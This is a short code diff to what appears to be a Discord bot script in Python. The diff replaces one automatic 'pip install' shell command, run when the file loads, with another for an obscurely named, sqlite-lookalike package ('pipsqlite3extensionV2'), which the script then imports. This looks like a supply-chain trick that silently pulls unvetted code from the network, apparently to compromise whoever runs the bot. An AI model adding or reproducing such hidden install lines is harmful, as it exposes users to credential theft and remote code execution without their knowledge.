@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install syssqlite3V2")
-import syssqlite3V2
+os.system("pip install pipsqlite3extensionV2")
+import pipsqlite3extensionV2
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
